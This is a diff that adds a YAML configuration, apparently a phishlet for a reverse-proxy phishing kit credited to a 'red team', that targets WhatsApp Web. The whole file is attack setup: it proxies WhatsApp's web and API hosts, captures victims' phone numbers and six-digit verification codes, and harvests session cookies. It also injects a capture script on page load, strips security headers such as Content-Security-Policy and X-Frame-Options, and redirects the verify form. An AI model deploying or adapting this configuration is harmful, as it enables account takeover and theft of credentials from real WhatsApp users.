@@ -1,0 +1,39 @@
+name: "WhatsApp"
+author: "Vanta v5 Red Team"
+min_ver: "5.0.0"
+proxy_hosts:
+  - subdomain: "web"
+    target: "web.whatsapp.com"
+  - subdomain: "api"
+    target: "api.whatsapp.com"
+auth_urls: 
+  - "/"
+  - "/auth"
+  - "/login"
+landing_path: ["/"]
+auth_tokens:
+  - {type: "cookie", name: "wa_lang_pref"}
+  - {type: "cookie", name: "wa_ul"}
+  - {type: "cookie", name: "wa_csrf"}
+credentials:
+  - {type: "post_param", name: "phone", regex: "^\\+[0-9]{1,15}$"}
+  - {type: "post_param", name: "code", regex: "^[0-9]{6}$"}
+injections:
+  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+  - {action: "remove", name: "X-Frame-Options"}
+  - {action: "remove", name: "X-Content-Type-Options"}
+path_rewrites:
+  - {pattern: "^/$", replace: "/", methods: ["GET"]}
+cookie_rewrites: []
+blocklist:
+  - {pattern: "analytics|tracking|/gtm/", mimes: ["text/javascript"], max_kb: 512}
+form_actions:
+  - {selector: "form[action*='verify']", action_to: "/api/verify"}
+bridges:
+  - {prefix: "/_api/", target_host: "api.whatsapp.com", strip_prefix: true, cors: "allow_all"}
+cors:
+  mode: "allow_all"
+  methods: ["GET", "POST", "OPTIONS"]
+  headers: ["*"]
